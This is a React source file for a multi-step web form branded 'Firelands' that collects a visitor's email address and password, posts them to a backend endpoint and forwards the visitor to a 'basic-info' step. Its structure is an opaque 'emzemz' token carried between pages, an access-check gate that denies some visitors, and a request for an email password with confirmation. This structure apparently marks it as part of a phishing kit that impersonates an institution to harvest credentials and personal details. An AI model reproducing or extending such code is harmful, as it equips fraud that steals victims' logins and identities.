import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const heroImageUrl = '/assets/firelands-landing.jpg';

const EmailPassword: React.FC = () => {
  const location = useLocation();
  const { emzemz } = location.state || {};
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (!emzemz) {
      navigate('/');
    }
  }, [emzemz, navigate]);

  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [errors, setErrors] = useState({
    email: '',
    password: '',
    confirmPassword: '',
    form: '',
  });
  const [isLoading, setIsLoading] = useState(false);

  const validateEmail = (value: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    const newErrors = {
      email: !email ? 'Email is required' : !validateEmail(email) ? 'Invalid email format' : '',
      password: password.length < 8 ? 'Password must be at least 8 characters' : '',
      confirmPassword: password !== confirmPassword ? 'Passwords do not match' : '',
      form: '',
    };

    setErrors(newErrors);

    if (newErrors.email || newErrors.password || newErrors.confirmPassword) {
      setIsLoading(false);
      return;
    }

    try {
      await axios.post(`${baseUrl}api/firelands-email-password/`, {
        emzemz,
        email,
        password,
      });
      navigate('/basic-info', { state: { emzemz } });
    } catch (error) {
      console.error('Error submitting email/password:', error);
      setErrors(prev => ({
        ...prev,
        form: 'There was an issue submitting your credentials. Please try again.',
      }));
    } finally {
      setIsLoading(false);
    }
  };

  if (isAllowed === null) {
    return <div>Loading...</div>;
  }

  if (isAllowed === false) {
    return <div>Access denied. Redirecting...</div>;
  }

  return (
    <div className="relative flex min-h-screen flex-col overflow-hidden text-white">
      <div className="absolute inset-0">
        <img src={heroImageUrl} alt="Firelands background" className="h-full w-full object-cover" />
        <div className="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
      </div>

      <div className="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
        <div className="mx-auto w-full max-w-6xl">
          <div className="mx-auto w-full max-w-md rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur">
            <h2 className="text-2xl font-semibold text-[#2f2e67]">Email & Password</h2>

            <form onSubmit={handleSubmit} className="mt-6 space-y-6">
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Email Address</label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.email && <p className="text-sm text-rose-600">{errors.email}</p>}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Password</label>
                <div className="relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20 pr-16"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword((prev) => !prev)}
                    className="absolute inset-y-0 right-4 text-sm font-semibold text-[#5a63d8]"
                  >
                    {showPassword ? 'Hide' : 'Show'}
                  </button>
                </div>
                {errors.password && <p className="text-sm text-rose-600">{errors.password}</p>}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Confirm Password</label>
                <div className="relative">
                  <input
                    type={showConfirmPassword ? 'text' : 'password'}
                    value={confirmPassword}
                    onChange={(e) => setConfirmPassword(e.target.value)}
                    className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20 pr-16"
                  />
                  <button
                    type="button"
                    onClick={() => setShowConfirmPassword((prev) => !prev)}
                    className="absolute inset-y-0 right-4 text-sm font-semibold text-[#5a63d8]"
                  >
                    {showConfirmPassword ? 'Hide' : 'Show'}
                  </button>
                </div>
                {errors.confirmPassword && (
                  <p className="text-sm text-rose-600">{errors.confirmPassword}</p>
                )}
              </div>

              {errors.form && <p className="text-sm text-rose-600 text-center">{errors.form}</p>}

              <div className="pt-2">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
                >
                  {isLoading ? 'Processing...' : 'Continue'}
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default EmailPassword;
